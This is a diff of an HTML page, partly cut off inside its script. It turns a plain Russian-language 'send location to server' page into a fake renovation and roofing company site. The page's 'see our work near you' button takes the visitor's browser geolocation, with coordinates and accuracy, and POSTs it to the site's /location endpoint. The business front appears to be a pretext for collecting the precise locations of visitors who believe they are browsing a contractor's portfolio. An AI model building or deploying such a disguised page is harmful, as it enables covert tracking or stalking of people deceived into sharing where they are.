@@ -3,27 +3,169 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Отправка местоположения</title>
+  <title>Отделочные работы и кровля</title>
   <style>
-    body { font-family: Arial, sans-serif; max-width: 600px; margin: 40px auto; padding: 0 20px; background: #f4f6f8; color: #222; }
-    .card { background: white; border-radius: 12px; padding: 24px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
-    button { background: #2563eb; color: white; border: none; padding: 14px 24px; font-size: 16px; border-radius: 8px; cursor: pointer; }
-    button:hover { background: #1d4ed8; }
-    #result { margin-top: 16px; padding: 12px; background: #eef2ff; border-radius: 8px; font-family: monospace; display: none; }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      /* Бежевый фон */
+      background: #f5efe0;
+      color: #3a342c;
+      min-height: 100vh;
+    }
+
+    /* Шапка с заголовком */
+    .hero {
+      text-align: center;
+      padding: 50px 20px 30px;
+      background: linear-gradient(180deg, #fffdf7, #f5efe0);
+    }
+
+    .logo {
+      font-size: 40px;
+      margin-bottom: 10px;
+    }
+
+    h1 {
+      font-size: 32px;
+      color: #4a3f30;
+      line-height: 1.3;
+    }
+
+    h1 span {
+      color: #b8860b;
+    }
+
+    .subtitle {
+      margin-top: 10px;
+      color: #7a6f5d;
+      font-size: 17px;
+    }
+
+    /* Галерея фото */
+    .gallery {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+      gap: 16px;
+      padding: 20px;
+      max-width: 1000px;
+      margin: 0 auto;
+    }
+
+    .gallery .photo {
+      height: 200px;
+      border-radius: 16px;
+      background-size: cover;
+      background-position: center;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.15);
+    }
+
+    .caption {
+      text-align: center;
+      color: #7a6f5d;
+      font-size: 14px;
+      margin-top: 6px;
+    }
+
+    /* Карточка с местоположением */
+    .location-card {
+      background: white;
+      border-radius: 24px;
+      max-width: 500px;
+      margin: 30px auto;
+      padding: 36px 28px;
+      text-align: center;
+      box-shadow: 0 12px 40px rgba(0,0,0,0.12);
+      border: 1px solid #e8dfcf;
+    }
+
+    .location-card h2 {
+      font-size: 24px;
+      color: #4a3f30;
+      margin-bottom: 8px;
+    }
+
+    .location-card p {
+      color: #7a6f5d;
+      margin-bottom: 20px;
+    }
+
+    button {
+      background: linear-gradient(135deg, #b8860b, #d4a017);
+      color: white;
+      border: none;
+      padding: 16px 32px;
+      font-size: 17px;
+      font-weight: 600;
+      border-radius: 50px;
+      cursor: pointer;
+      box-shadow: 0 8px 20px rgba(184,134,11,0.4);
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+
+    button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 12px 28px rgba(184,134,11,0.5);
+    }
+
+    #result {
+      margin-top: 20px;
+      padding: 16px;
+      background: #faf6ec;
+      border-radius: 12px;
+      font-family: monospace;
+      color: #3a342c;
+      display: none;
+      border: 1px solid #e8dfcf;
+    }
+
+    .footer {
+      text-align: center;
+      padding: 30px 20px;
+      color: #a89a82;
+      font-size: 13px;
+    }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h1>Отправка местоположения на сервер</h1>
-    <button id="sendBtn">📤 Отправить моё местоположение</button>
+
+  <!-- Шапка -->
+  <div class="hero">
+    <div class="logo">🏠</div>
+    <h1>Отделочные работы и кровля.<br><span>Напрямую от компании</span></h1>
+    <p class="subtitle">Ремонт квартир, отделка и кровельные работы под ключ</p>
+  </div>
+
+  <!-- Галерея фото -->
+  <div class="gallery">
+    <div>
+      <div class="photo" style="background-image:url('https://images.unsplash.com/photo-1581858726788-75bc0f6a952d?w=600&q=80');"></div>
+      <div class="caption">Отделка квартиры</div>
+    </div>
+    <div>
+      <div class="photo" style="background-image:url('https://images.unsplash.com/photo-1635405074683-96d6921a2a68?w=600&q=80');"></div>
+      <div class="caption">Кровельные работы</div>
+    </div>
+    <div>
+      <div class="photo" style="background-image:url('https://images.unsplash.com/photo-1503387762-592deb58ef4e?w=600&q=80');"></div>
+      <div class="caption">Ремонт под ключ</div>
+    </div>
+  </div>
+
+  <!-- Карточка: поделиться местоположением -->
+  <div class="location-card">
+    <h2>Смотреть работу рядом</h2>
+    <p>Поделитесь своим местоположением, чтобы мы показали объекты рядом с вами</p>
+    <button id="sendBtn">📍 Поделиться местоположением</button>
     <div id="result"></div>
   </div>
+
+  <div class="footer">© Отделочные работы и кровля · Напрямую от компании</div>
 
   <script>
     const result = document.getElementById('result');
     const sendBtn = document.getElementById('sendBtn');
-
-    // Относительный адрес — работает и локально, и на Render
     const SERVER_URL = '/location';
 
     function show(text) {
@@ -37,9 +179,7 @@
         longitude: position.coords.longitude,
         accuracy: position.coords.accuracy
       };
-
       show('Отправляю координаты на сервер...');
-
       try {
         const response = await fetch(SERVER_URL, {
           method: 'POST',
